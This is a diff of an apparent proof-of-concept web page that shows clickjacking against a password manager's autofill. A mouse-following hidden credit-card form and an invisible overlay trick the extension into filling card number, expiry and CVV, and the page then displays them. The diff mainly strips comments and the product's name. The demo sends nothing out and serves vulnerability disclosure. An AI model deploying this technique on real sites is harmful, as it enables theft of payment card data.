@@ -2,7 +2,7 @@
 <html lang="en">
 <meta charset="utf-8" />
 <head>
-<title>Welcome to Mallory's website...</title>
+<title>Clickjacking test</title>
 </head>
 <body>
 <div id='maincontainer' style='z-index:1000000; opacity: 1; pointer-events:none; position:absolute; top:0; left:0; width:100%; height:100%; background-color:#ffffff;'>
@@ -33,7 +33,6 @@
 </div>
 </div>
 
-<!-- A bait form that follows user's mouse to trigger opening Lastpass. -->
 <form id="baitform" action="" method="post" style='position: absolute;'>
   <div>
   <label style='display:block;width:200px;height:20px;' for="cc_number">Credit card number</label><br>
@@ -76,7 +75,6 @@
 	  el.style.left = e.clientX - 100 + 'px';
 	  el.style.top = e.clientY - 60 +'px';
   };
-  // Just a trick to use another event loop to hide the Lastpass's iframe.
   setInterval(() => {
 	  var el = getLPDialog();
 	  if (el) {
@@ -103,13 +101,11 @@
 	  if (els.length) return els[0]; else return null;
   }
   
-  // Can't detect whether lastpass dialog is up but all you need is to
-  // wait for the input field to be focused and wait for some time...
   var waitingLPperinfo = document.querySelector('#cc_number').onfocus = (e) => {
 	  console.log('Bait focused');
 	  setTimeout(function() {
 		  var el = getLPDialog();
-		  console.log('Supposed Lastpass dropdown is on');
+		  console.log('Supposed app dropdown is on');
 		  if (el) {
 			  document.querySelector('#cookiesasker').remove();
 			  document.querySelector('#maincontainer').style.pointerEvents = 'auto';
@@ -123,13 +119,13 @@
 
   var breaknews = setInterval(function() {
 	  if (document.querySelector('#cc_number').value) {
-		  setTimeout(() => { // Wait for Lastpass to fill in everything.
+		  setTimeout(() => { 
 			  document.querySelector('#badnews').textContent = 'Hello, '+
 				  document.querySelector('#cc_name').value + '. ' +
 				  'Your credit card number is ' + document.querySelector('#cc_number').value + ', ' +
 				  'expiring on ' + document.querySelector('#cc_expiry_month').value + '/' + document.querySelector('#cc_expiry_year').value + 
 				  ' with CVV being ' + document.querySelector('#cc_cvv').value + '. ' +
-				  'This is not sent anywhere but you know the Lastpass browser extension is leaking your card.';
+				  'This is not sent anywhere but you know that app is leaking your card.';
 			  document.querySelector('#badnews').style.opacity = 1;
 			  document.querySelector('#thecat').style.opacity = 0;
 			  document.querySelector('#greet').style.opacity = 0;
